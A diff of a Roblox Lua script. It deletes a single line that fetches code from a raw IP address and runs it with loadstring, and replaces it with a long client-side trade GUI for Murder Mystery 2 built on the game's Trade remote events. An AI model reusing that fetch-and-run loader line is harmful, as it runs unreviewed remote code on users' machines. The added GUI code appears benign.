@@ -1,1 +1,558 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjAwNGFkODZkLTFmNGMtNDZiZS1iZWQ1LWYxOTUyZjAxZTFjYSIsImtpbmQiOiJsb2FkZXIifQ"))()
+--[[
+    MM2 Local Trade GUI
+    Place this LocalScript inside StarterPlayerScripts (or StarterGui)
+    
+    Based on the game's existing TradeModule, Trade RemoteEvents/Functions,
+    and InventoryModule found in the place file.
+    
+    Features:
+        - Send / cancel / accept / decline trade requests
+        - Browse your tradeable inventory (Weapons + Pets)
+        - Add / remove items from your offer (up to 4 slots)
+        - See the other player's offer in real time
+        - Accept / un-accept the trade
+        - Responsive MM2-style dark UI
+--]]
+ 
+-- ─── Services ───────────────────────────────────────────────────────────────
+local Players          = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService     = game:GetService("TweenService")
+ 
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
+ 
+-- ─── RemoteEvents / Functions (match the game's Trade folder) ────────────────
+local Trade            = ReplicatedStorage:WaitForChild("Trade")
+local RE_SendRequest   = Trade:WaitForChild("SendRequest")      -- RemoteFunction
+local RE_CancelRequest = Trade:WaitForChild("CancelRequest")    -- RemoteEvent
+local RE_AcceptRequest = Trade:WaitForChild("AcceptRequest")    -- RemoteEvent
+local RE_DeclineRequest= Trade:WaitForChild("DeclineRequest")   -- RemoteEvent
+local RE_AddOffer      = Trade:WaitForChild("AddOffer")         -- RemoteEvent
+local RE_RemoveOffer   = Trade:WaitForChild("RemoveOffer")      -- RemoteEvent
+local RE_TradeUpdate   = Trade:WaitForChild("TradeUpdate")      -- RemoteEvent
+local RE_GetStatus     = Trade:WaitForChild("GetTradeStatus")   -- RemoteFunction
+local RE_RequestSent   = Trade:WaitForChild("RequestSent")      -- RemoteEvent
+ 
+-- ─── Rarity Colours (mirrors the game's Sync.Rarities) ──────────────────────
+local RARITY_COLORS = {
+    Common       = Color3.fromRGB(170, 170, 170),
+    Uncommon     = Color3.fromRGB(0,   200,  80),
+    Rare         = Color3.fromRGB(0,   140, 255),
+    Epic         = Color3.fromRGB(160,  50, 230),
+    Legendary    = Color3.fromRGB(255, 175,   0),
+    Ancient      = Color3.fromRGB(220,  50,  50),
+    Godly        = Color3.fromRGB(255, 215,   0),
+    Unique       = Color3.fromRGB(255, 105, 180),
+}
+local function rarityColor(rarity)
+    return RARITY_COLORS[rarity] or RARITY_COLORS.Common
+end
+ 
+-- ─── Constants ───────────────────────────────────────────────────────────────
+local MAX_OFFER_SLOTS = 4
+local SLOT_SIZE = UDim2.new(0, 90, 0, 90)
+local BG_COLOR  = Color3.fromRGB(22, 22, 28)
+local PANEL_COLOR = Color3.fromRGB(32, 32, 40)
+local ACCENT    = Color3.fromRGB(255, 60, 80)
+ 
+-- ─── State ───────────────────────────────────────────────────────────────────
+local myOffer       = {}   -- { [slot] = {itemID, amount, itemType} }
+local theirOffer    = {}
+local tradePartner  = nil  -- Player object
+local myAccepted    = false
+local theirAccepted = false
+local inTrade       = false
+local requestsEnabled = true
+ 
+-- ─── GUI Builder Helpers ─────────────────────────────────────────────────────
+local function makeLabel(parent, text, size, pos, textColor, fontSize, font)
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = size
+    lbl.Position = pos
+    lbl.BackgroundTransparency = 1
+    lbl.Text = text
+    lbl.TextColor3 = textColor or Color3.new(1,1,1)
+    lbl.TextScaled = true
+    lbl.Font = font or Enum.Font.GothamBold
+    lbl.Parent = parent
+    return lbl
+end
+ 
+local function makeButton(parent, text, size, pos, bgColor, textColor)
+    local btn = Instance.new("TextButton")
+    btn.Size = size
+    btn.Position = pos
+    btn.BackgroundColor3 = bgColor or ACCENT
+    btn.TextColor3 = textColor or Color3.new(1,1,1)
+    btn.Text = text
+    btn.TextScaled = true
+    btn.Font = Enum.Font.GothamBold
+    btn.BorderSizePixel = 0
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = btn
+    btn.Parent = parent
+    return btn
+end
+ 
+local function makeFrame(parent, size, pos, color, alpha)
+    local f = Instance.new("Frame")
+    f.Size = size
+    f.Position = pos
+    f.BackgroundColor3 = color or PANEL_COLOR
+    f.BackgroundTransparency = alpha or 0
+    f.BorderSizePixel = 0
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = f
+    f.Parent = parent
+    return f
+end
+ 
+-- ─── Build ScreenGui ─────────────────────────────────────────────────────────
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "MM2_LocalTradeGUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = PlayerGui
+ 
+-- ══════════════════════════════════════════════════════════════════════════════
+--  REQUEST WINDOW  (Send / Receive)
+-- ══════════════════════════════════════════════════════════════════════════════
+local RequestBG = makeFrame(ScreenGui,
+    UDim2.new(0, 340, 0, 160),
+    UDim2.new(0.5, -170, 0.5, -80),
+    BG_COLOR)
+RequestBG.Name = "RequestFrame"
+RequestBG.Visible = false
+ 
+-- ── Sending sub-panel ──
+local Sending = makeFrame(RequestBG,
+    UDim2.new(1, -20, 1, -20),
+    UDim2.new(0, 10, 0, 10),
+    PANEL_COLOR)
+Sending.Name = "SendingRequest"
+makeLabel(Sending, "Trade request sent to:", UDim2.new(1,-10,0,22), UDim2.new(0,5,0,8))
+local SendingName = makeLabel(Sending, "", UDim2.new(1,-10,0,26), UDim2.new(0,5,0,34), Color3.fromRGB(255,200,60))
+SendingName.Name = "Username"
+local CancelBtn = makeButton(Sending, "Cancel", UDim2.new(0,100,0,32), UDim2.new(0.5,-50,1,-42))
+CancelBtn.Name = "Cancel"
+ 
+-- ── Receiving sub-panel ──
+local Receiving = makeFrame(RequestBG,
+    UDim2.new(1, -20, 1, -20),
+    UDim2.new(0, 10, 0, 10),
+    PANEL_COLOR)
+Receiving.Name = "ReceivingRequest"
+Receiving.Visible = false
+makeLabel(Receiving, "Trade request from:", UDim2.new(1,-10,0,22), UDim2.new(0,5,0,8))
+local RecvName = makeLabel(Receiving, "", UDim2.new(1,-10,0,26), UDim2.new(0,5,0,34), Color3.fromRGB(255,200,60))
+RecvName.Name = "Username"
+local AcceptReqBtn  = makeButton(Receiving, "Accept",  UDim2.new(0,100,0,32), UDim2.new(0.25,-50,1,-42), Color3.fromRGB(0,180,80))
+local DeclineReqBtn = makeButton(Receiving, "Decline", UDim2.new(0,100,0,32), UDim2.new(0.75,-50,1,-42), Color3.fromRGB(180,40,40))
+ 
+-- ══════════════════════════════════════════════════════════════════════════════
+--  MAIN TRADE WINDOW
+-- ══════════════════════════════════════════════════════════════════════════════
+local TradeWindow = makeFrame(ScreenGui,
+    UDim2.new(0, 700, 0, 480),
+    UDim2.new(0.5, -350, 0.5, -240),
+    BG_COLOR)
+TradeWindow.Name = "TradeWindow"
+TradeWindow.Visible = false
+ 
+-- Title bar
+local TitleBar = makeFrame(TradeWindow, UDim2.new(1,0,0,40), UDim2.new(0,0,0,0), ACCENT, 0)
+TitleBar.ZIndex = 2
+makeLabel(TitleBar, "⚔  MM2 TRADE", UDim2.new(1,-100,1,0), UDim2.new(0,10,0,0))
+local CloseBtn = makeButton(TitleBar, "✕", UDim2.new(0,36,0,30), UDim2.new(1,-42,0,5), Color3.fromRGB(60,30,30))
+ 
+-- Partner label
+local PartnerLabel = makeLabel(TradeWindow, "Trading with: —",
+    UDim2.new(1,-20,0,24), UDim2.new(0,10,0,44), Color3.fromRGB(200,200,200), 14)
+ 
+-- ── YOUR OFFER panel ──
+local YourPanel = makeFrame(TradeWindow,
+    UDim2.new(0.48, -5, 0, 220),
+    UDim2.new(0, 10, 0, 72), PANEL_COLOR)
+makeLabel(YourPanel, "YOUR OFFER", UDim2.new(1,-10,0,20), UDim2.new(0,5,0,4), ACCENT)
+ 
+local YourSlots = Instance.new("Frame")
+YourSlots.Name = "Slots"
+YourSlots.Size = UDim2.new(1,-10,0,100)
+YourSlots.Position = UDim2.new(0,5,0,28)
+YourSlots.BackgroundTransparency = 1
+YourSlots.Parent = YourPanel
+ 
+local YourGrid = Instance.new("UIGridLayout")
+YourGrid.CellSize = UDim2.new(0,90,0,90)
+YourGrid.CellPadding = UDim2.new(0,5,0,5)
+YourGrid.Parent = YourSlots
+ 
+local YourAcceptedBadge = makeLabel(YourPanel, "✔ Accepted", UDim2.new(1,-10,0,22), UDim2.new(0,5,1,-30), Color3.fromRGB(80,220,80))
+YourAcceptedBadge.Visible = false
+ 
+-- ── THEIR OFFER panel ──
+local TheirPanel = makeFrame(TradeWindow,
+    UDim2.new(0.48, -5, 0, 220),
+    UDim2.new(0.52, 0, 0, 72), PANEL_COLOR)
+makeLabel(TheirPanel, "THEIR OFFER", UDim2.new(1,-10,0,20), UDim2.new(0,5,0,4), Color3.fromRGB(120,200,255))
+ 
+local TheirName = makeLabel(TheirPanel, "", UDim2.new(0.5,0,0,16), UDim2.new(0.5,0,0,4), Color3.fromRGB(200,200,200), 12)
+TheirName.Font = Enum.Font.Gotham
+ 
+local TheirSlots = Instance.new("Frame")
+TheirSlots.Name = "Slots"
+TheirSlots.Size = UDim2.new(1,-10,0,100)
+TheirSlots.Position = UDim2.new(0,5,0,28)
+TheirSlots.BackgroundTransparency = 1
+TheirSlots.Parent = TheirPanel
+ 
+local TheirGrid = Instance.new("UIGridLayout")
+TheirGrid.CellSize = UDim2.new(0,90,0,90)
+TheirGrid.CellPadding = UDim2.new(0,5,0,5)
+TheirGrid.Parent = TheirSlots
+ 
+local TheirAcceptedBadge = makeLabel(TheirPanel, "✔ Accepted", UDim2.new(1,-10,0,22), UDim2.new(0,5,1,-30), Color3.fromRGB(80,220,80))
+TheirAcceptedBadge.Visible = false
+ 
+-- ── Action buttons ──
+local ActionsRow = makeFrame(TradeWindow, UDim2.new(1,-20,0,44), UDim2.new(0,10,1,-56), Color3.fromRGB(18,18,24), 0)
+local AcceptTradeBtn  = makeButton(ActionsRow, "Accept Trade",  UDim2.new(0,160,0,36), UDim2.new(0,0,0,4), Color3.fromRGB(0,180,80))
+local CancelTradeBtn  = makeButton(ActionsRow, "Cancel Trade",  UDim2.new(0,160,0,36), UDim2.new(0,168,0,4), Color3.fromRGB(180,40,40))
+ 
+-- ── Inventory browser (bottom) ──
+local InvPanel = makeFrame(TradeWindow,
+    UDim2.new(1,-20,0,150),
+    UDim2.new(0,10,0,302), PANEL_COLOR)
+makeLabel(InvPanel, "YOUR INVENTORY  (click to add)", UDim2.new(1,-10,0,20), UDim2.new(0,5,0,4), Color3.fromRGB(200,200,200), 12, Enum.Font.Gotham)
+ 
+local InvScroll = Instance.new("ScrollingFrame")
+InvScroll.Size = UDim2.new(1,-10,1,-28)
+InvScroll.Position = UDim2.new(0,5,0,26)
+InvScroll.BackgroundTransparency = 1
+InvScroll.ScrollBarThickness = 4
+InvScroll.CanvasSize = UDim2.new(0,0,0,0)
+InvScroll.AutomaticCanvasSize = Enum.AutomaticSize.X
+InvScroll.ScrollingDirection = Enum.ScrollingDirection.X
+InvScroll.Parent = InvPanel
+ 
+local InvGrid = Instance.new("UIListLayout")
+InvGrid.FillDirection = Enum.FillDirection.Horizontal
+InvGrid.Padding = UDim.new(0,6)
+InvGrid.Parent = InvScroll
+ 
+-- ══════════════════════════════════════════════════════════════════════════════
+--  OPEN TRADE BUTTON  (floating bottom-right)
+-- ══════════════════════════════════════════════════════════════════════════════
+local OpenBtn = makeButton(ScreenGui, "🔄 Trade",
+    UDim2.new(0,110,0,38),
+    UDim2.new(1,-120,1,-50),
+    Color3.fromRGB(40,40,55))
+OpenBtn.ZIndex = 5
+ 
+-- ══════════════════════════════════════════════════════════════════════════════
+--  Helper: build an item slot Frame
+-- ══════════════════════════════════════════════════════════════════════════════
+local function buildSlot(parent, itemData, isYours, slotIndex)
+    local slot = makeFrame(parent, UDim2.new(0,90,0,90), UDim2.new(0,0,0,0),
+        itemData and rarityColor(itemData.Rarity) or Color3.fromRGB(50,50,60))
+    slot.BackgroundTransparency = itemData and 0.5 or 0.6
+ 
+    if itemData then
+        local img = Instance.new("ImageLabel")
+        img.Size = UDim2.new(1,-4,1,-20)
+        img.Position = UDim2.new(0,2,0,2)
+        img.BackgroundTransparency = 1
+        img.Image = itemData.Image and
+            ("rbxassetid://"..tostring(itemData.Image)) or ""
+        img.Parent = slot
+ 
+        local nameLbl = makeLabel(slot, itemData.ItemName or itemData.Name or "?",
+            UDim2.new(1,0,0,18), UDim2.new(0,0,1,-18),
+            Color3.new(1,1,1), 11, Enum.Font.Gotham)
+        nameLbl.BackgroundColor3 = rarityColor(itemData.Rarity)
+        nameLbl.BackgroundTransparency = 0.2
+        nameLbl.TextXAlignment = Enum.TextXAlignment.Center
+ 
+        if isYours then
+            local rmBtn = makeButton(slot, "✕",
+                UDim2.new(0,18,0,18), UDim2.new(1,-20,0,2),
+                Color3.fromRGB(180,40,40))
+            rmBtn.ZIndex = 10
+            rmBtn.MouseButton1Click:Connect(function()
+                RE_RemoveOffer:FireServer(itemData.DataID or itemData.Name, itemData.DataType or "Weapons")
+            end)
+        end
+    else
+        makeLabel(slot, "+", UDim2.new(1,0,1,0), UDim2.new(0,0,0,0),
+            Color3.fromRGB(100,100,120), 28)
+    end
+    return slot
+end
+ 
+-- ══════════════════════════════════════════════════════════════════════════════
+--  Helper: build an inventory item button
+-- ══════════════════════════════════════════════════════════════════════════════
+local function buildInvItem(parent, itemData)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0,80,0,106)
+    btn.BackgroundColor3 = rarityColor(itemData.Rarity)
+    btn.BackgroundTransparency = 0.5
+    btn.Text = ""
+    btn.BorderSizePixel = 0
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0,6)
+    corner.Parent = btn
+ 
+    local img = Instance.new("ImageLabel")
+    img.Size = UDim2.new(1,-4,0,80)
+    img.Position = UDim2.new(0,2,0,2)
+    img.BackgroundTransparency = 1
+    img.Image = itemData.Image and ("rbxassetid://"..tostring(itemData.Image)) or ""
+    img.Parent = btn
+ 
+    makeLabel(btn, itemData.ItemName or itemData.Name or "?",
+        UDim2.new(1,0,0,22), UDim2.new(0,0,1,-22),
+        Color3.new(1,1,1), 10, Enum.Font.Gotham)
+ 
+    btn.MouseButton1Click:Connect(function()
+        RE_AddOffer:FireServer(itemData.DataID or itemData.Name, 1, itemData.DataType or "Weapons")
+    end)
+    btn.Parent = parent
+    return btn
+end
+ 
+-- ══════════════════════════════════════════════════════════════════════════════
+--  Render offer panels
+-- ══════════════════════════════════════════════════════════════════════════════
+local function renderOfferPanel(slotsParent, offerTable, isYours)
+    for _, ch in ipairs(slotsParent:GetChildren()) do
+        if ch:IsA("Frame") then ch:Destroy() end
+    end
+    local count = 0
+    for slot, item in pairs(offerTable) do
+        count += 1
+        buildSlot(slotsParent, item, isYours, slot)
+    end
+    for i = count+1, MAX_OFFER_SLOTS do
+        buildSlot(slotsParent, nil, false, i)
+    end
+end
+ 
+-- ══════════════════════════════════════════════════════════════════════════════
+--  Populate inventory browser from ProfileData / existing API
+-- ══════════════════════════════════════════════════════════════════════════════
+local function populateInventory()
+    -- Clear existing items
+    for _, ch in ipairs(InvScroll:GetChildren()) do
+        if not ch:IsA("UIListLayout") then ch:Destroy() end
+    end
+ 
+    -- Try to get inventory data from the game's existing modules
+    local ok, ProfileData = pcall(function()
+        return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("ProfileData"))
+    end)
+    if not ok or not ProfileData then return end
+ 
+    local profile = ProfileData.GetProfile and ProfileData.GetProfile()
+    if not profile then return end
+ 
+    local Sync = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"))
+ 
+    -- Show Weapons and Pets (tradeable categories)
+    for _, category in ipairs({"Weapons", "Pets"}) do
+        local owned = profile[category] and profile[category].Owned or {}
+        for itemID, _ in pairs(owned) do
+            local itemDef = Sync[category] and Sync[category][itemID]
+            if itemDef then
+                local itemData = {}
+                for k,v in pairs(itemDef) do itemData[k] = v end
+                itemData.DataID   = itemID
+                itemData.DataType = category
+                itemData.Rarity   = itemData.Rarity or "Common"
+                buildInvItem(InvScroll, itemData)
+            end
+        end
+    end
+end
+ 
+-- ══════════════════════════════════════════════════════════════════════════════
+--  Request window helpers
+-- ══════════════════════════════════════════════════════════════════════════════
+local function showRequestPanel(panel)
+    Sending.Visible   = (panel == "Sending")
+    Receiving.Visible = (panel == "Receiving")
+    RequestBG.Visible = (panel ~= nil)
+end
+ 
+local function updateRequestWindow(state, data)
+    if state == "SendingRequest" then
+        SendingName.Text = data and data.Receiver and data.Receiver.Name or "..."
+        showRequestPanel("Sending")
+    elseif state == "ReceivingRequest" then
+        RecvName.Text = data and data.Sender and data.Sender.Name or "..."
+        showRequestPanel("Receiving")
+    else
+        showRequestPanel(nil)
+    end
+end
+ 
+-- ══════════════════════════════════════════════════════════════════════════════
+--  Trade window update (called on TradeUpdate event)
+-- ══════════════════════════════════════════════════════════════════════════════
+local function onTradeUpdate(tradeData)
+    if not tradeData then
+        -- Trade ended / cancelled
+        inTrade = false
+        TradeWindow.Visible = false
+        myOffer = {}
+        theirOffer = {}
+        tradePartner = nil
+        return
+    end
+ 
+    inTrade = true
+    TradeWindow.Visible = true
+    populateInventory()
+ 
+    -- Determine which player slot we are
+    local myKey, theirKey
+    if tradeData.Player1 and tradeData.Player1.Player == LocalPlayer then
+        myKey, theirKey = "Player1", "Player2"
+    elseif tradeData.Player2 and tradeData.Player2.Player == LocalPlayer then
+        myKey, theirKey = "Player2", "Player1"
+    else
+        return
+    end
+ 
+    -- Translate offer arrays to keyed tables
+    myOffer    = {}
+    theirOffer = {}
+    if tradeData[myKey] then
+        for i, v in ipairs(tradeData[myKey].Offer or {}) do
+            myOffer[i] = {
+                ItemID   = v[1] or v.ItemID,
+                Amount   = v[2] or v.Amount,
+                ItemType = v[3] or v.ItemType,
+                DataID   = v[1] or v.ItemID,
+                DataType = v[3] or v.ItemType,
+                ItemName = v[1] or v.ItemID,
+                Rarity   = "Common",
+            }
+        end
+        myAccepted = tradeData[myKey].Accepted or false
+    end
+    if tradeData[theirKey] then
+        for i, v in ipairs(tradeData[theirKey].Offer or {}) do
+            theirOffer[i] = {
+                ItemID   = v[1] or v.ItemID,
+                Amount   = v[2] or v.Amount,
+                ItemType = v[3] or v.ItemType,
+                DataID   = v[1] or v.ItemID,
+                DataType = v[3] or v.ItemType,
+                ItemName = v[1] or v.ItemID,
+                Rarity   = "Common",
+            }
+        end
+        theirAccepted   = tradeData[theirKey].Accepted or false
+        tradePartner    = tradeData[theirKey].Player
+        PartnerLabel.Text = "Trading with: " .. (tradePartner and tradePartner.Name or "?")
+        TheirName.Text    = tradePartner and tradePartner.Name or ""
+    end
+ 
+    -- Re-render slots
+    renderOfferPanel(YourSlots,  myOffer,    true)
+    renderOfferPanel(TheirSlots, theirOffer, false)
+ 
+    YourAcceptedBadge.Visible  = myAccepted
+    TheirAcceptedBadge.Visible = theirAccepted
+    AcceptTradeBtn.Text        = myAccepted and "✔ Accepted" or "Accept Trade"
+    AcceptTradeBtn.BackgroundColor3 = myAccepted
+        and Color3.fromRGB(0,140,60) or Color3.fromRGB(0,180,80)
+end
+ 
+-- ══════════════════════════════════════════════════════════════════════════════
+--  Button wiring
+-- ══════════════════════════════════════════════════════════════════════════════
+OpenBtn.MouseButton1Click:Connect(function()
+    TradeWindow.Visible = not TradeWindow.Visible
+    if TradeWindow.Visible then
+        populateInventory()
+    end
+end)
+ 
+CloseBtn.MouseButton1Click:Connect(function()
+    TradeWindow.Visible = false
+end)
+ 
+-- Request window
+CancelBtn.MouseButton1Click:Connect(function()
+    RE_CancelRequest:FireServer()
+    showRequestPanel(nil)
+end)
+ 
+AcceptReqBtn.MouseButton1Click:Connect(function()
+    RE_AcceptRequest:FireServer()
+    showRequestPanel(nil)
+end)
+ 
+DeclineReqBtn.MouseButton1Click:Connect(function()
+    RE_DeclineRequest:FireServer()
+    showRequestPanel(nil)
+end)
+ 
+-- In-trade actions
+AcceptTradeBtn.MouseButton1Click:Connect(function()
+    RE_AcceptRequest:FireServer()
+end)
+ 
+CancelTradeBtn.MouseButton1Click:Connect(function()
+    RE_CancelRequest:FireServer()
+    TradeWindow.Visible = false
+end)
+ 
+-- ══════════════════════════════════════════════════════════════════════════════
+--  Remote event listeners
+-- ══════════════════════════════════════════════════════════════════════════════
+RE_TradeUpdate.OnClientEvent:Connect(onTradeUpdate)
+ 
+RE_CancelRequest.OnClientEvent:Connect(function()
+    updateRequestWindow(nil)
+    onTradeUpdate(nil)
+end)
+ 
+RE_DeclineRequest.OnClientEvent:Connect(function()
+    updateRequestWindow(nil)
+end)
+ 
+RE_RequestSent.OnClientEvent:Connect(function(senderPlayer)
+    if requestsEnabled then
+        updateRequestWindow("ReceivingRequest", { Sender = { Name = senderPlayer.Name } })
+    end
+end)
+ 
+-- Trade request from another player (server invokes this client)
+pcall(function()
+    RE_SendRequest.OnClientInvoke = function(senderPlayer)
+        if requestsEnabled then
+            updateRequestWindow("ReceivingRequest", { Sender = { Name = senderPlayer.Name } })
+        end
+        return requestsEnabled
+    end
+end)
+ 
+-- ══════════════════════════════════════════════════════════════════════════════
+--  Init: restore in-progress trade state on load
+-- ══════════════════════════════════════════════════════════════════════════════
+task.spawn(function()
+    local ok, state, data = pcall(function()
+        return RE_GetStatus:InvokeServer()
+    end)
+    if ok and state then
+        updateRequestWindow(state, data)
+    end
+end)
+ 
+print("[MM2 LocalTradeGUI] Loaded successfully.")
